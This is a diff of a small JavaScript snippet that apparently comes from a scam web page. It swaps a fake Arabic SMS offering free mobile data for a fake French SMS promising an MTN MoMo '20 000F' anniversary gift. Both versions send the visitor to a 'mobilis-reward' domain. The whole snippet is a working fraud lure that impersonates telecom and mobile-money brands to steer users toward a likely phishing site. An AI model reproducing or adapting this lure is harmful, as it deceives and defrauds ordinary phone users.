@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '30 جيجابايت من البيانات'
-password=prompt('SMS: مبروك، رقمك مؤهل للحصول على 30 جيجابايت من البيانات المجانية في عرض يوم الاستقلال، يرجى الضغط على موافق للمتابعة ','30 جيجابايت من البيانات');
-if (password != '30 جيجابايت من البيانات') {
-location.href='https://mobilis-reward.goprogram.xyz/gift';
+var password = '20.000F'
+password=prompt('SMS : Félicitations, votre compte MTN MoMo est éligible pour recevoir le cadeau anniversaire de 20 000F, veuillez cliquer sur OK POUR CONTINUER');
+if (password != '20.000F') {
+location.href='https://mobilis-reward.goprogram.xyz/Gift';
 }
